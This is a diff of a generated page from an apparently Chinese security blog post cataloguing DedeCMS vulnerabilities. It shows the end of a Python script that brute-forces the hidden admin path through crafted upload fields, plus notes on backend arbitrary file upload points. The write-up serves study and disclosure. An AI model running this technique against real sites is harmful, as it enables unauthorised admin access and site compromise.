class="line">39</span></pre></td><td class="code"><pre><span class="line">            <span class="built_in">break</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">40</span></pre></td><td class="code"><pre><span class="line">        data[<span class="string">"_FILES[mochazz][tmp_name]"</span>] = data[<span class="string">"_FILES[mochazz][tmp_name]"</span>].format(p=back_dir+ch)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">41</span></pre></td><td class="code"><pre><span class="line">        r = requests.post(url, data=data)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">42</span></pre></td><td class="code"><pre><span class="line">        <span class="keyword">if</span> <span class="string">"Upload filetype not allow !"</span> not <span class="keyword">in</span> r.text and r.status_code == 200:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">43</span></pre></td><td class="code"><pre><span class="line">            back_dir += ch</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">44</span></pre></td><td class="code"><pre><span class="line">            <span class="built_in">print</span>(<span class="string">"[+] "</span>,back_dir)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">45</span></pre></td><td class="code"><pre><span class="line">            data[<span class="string">"_FILES[mochazz][tmp_name]"</span>] = <span class="string">"./&#123;p&#125;&lt;&lt;/images/adminico.gif"</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">46</span></pre></td><td class="code"><pre><span class="line">            <span class="built_in">break</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">47</span></pre></td><td class="code"><pre><span class="line">        <span class="keyword">else</span>:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">48</span></pre></td><td class="code"><pre><span class="line">            data[<span class="string">"_FILES[mochazz][tmp_name]"</span>] = <span class="string">"./&#123;p&#125;&lt;&lt;/images/adminico.gif"</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">49</span></pre></td><td class="code"><pre><span class="line"> </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">50</span></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">"admin url:"</span>,back_dir)</span></pre></td></tr></table></figure>
 
 <p>如图爆破结果<br><img src="http://zone.secevery.com/uploads/article/20191121/3b10323e6fa1a276229cdcbc1fa7c44b.png" class="img-polaroid" title="TIM截图20191119185506.png" alt="TIM截图20191119185506.png"></p>
-<h2 id="0x04Dede后台漏洞"><a href="#0x04Dede后台漏洞" class="headerlink" title="0x04Dede后台漏洞"></a>0x04Dede后台漏洞</h2><p>通过上面的漏洞我们已经来到了后台<br>这里就列举几个任意文件上传的位置</p>
+<h2 id="Dede后台漏洞"><a href="#Dede后台漏洞" class="headerlink" title="Dede后台漏洞"></a>Dede后台漏洞</h2><p>通过上面的漏洞我们已经来到了后台<br>这里就列举几个任意文件上传的位置</p>
 <h3 id="1-文件式管理器"><a href="#1-文件式管理器" class="headerlink" title="1.文件式管理器"></a>1.文件式管理器</h3><p>如图直接再后台的文件管理处上传，没有过滤机制<br><img src="http://zone.secevery.com/uploads/article/20191121/fb64e3dcb7b7badf703eae30cd067c22.png" class="img-polaroid" title="TIM截图20191121205142.png" alt="TIM截图20191121205142.png"></p>
 <h3 id="2-模块-广告"><a href="#2-模块-广告" class="headerlink" title="2.模块-广告"></a>2.模块-广告</h3><img src="http://zone.secevery.com/uploads/article/20191121/63b7f0ec304096a9e399f5eefba38a5f.png" class="img-polaroid" title="TIM截图20191121211029.png" alt="TIM截图20191121211029.png">
 
@@ -443,7 +432,7 @@
     <p><span class="copy-title">文章字数:</span><span class="post-count">2k</span></p>
     <p><span class="copy-title">本文作者:</span><a  title="BigSwords">BigSwords</a></p>
     <p><span class="copy-title">发布时间:</span>2019-12-05, 14:58:23</p>
-    <p><span class="copy-title">最后更新:</span>2019-12-05, 15:34:16</p>
+    <p><span class="copy-title">最后更新:</span>2019-12-23, 19:13:24</p>
     <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/12/05/3/" title="织梦内容管理系统(DedeCMS)漏洞集合">https://bigswords.github.io/2019/12/05/3/</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
@@ -527,7 +516,7 @@
     /*作者、标签的自动补全*/
     $(function () {
         $('.search').AutoComplete({
-            'data': ['#ThinkPHP','#框架','#dede','#cms',],
+            'data': ['#dede','#cms','#ThinkPHP','#框架',],
             'itemHeight': 20,
             'width': 418
         }).AutoComplete('show');
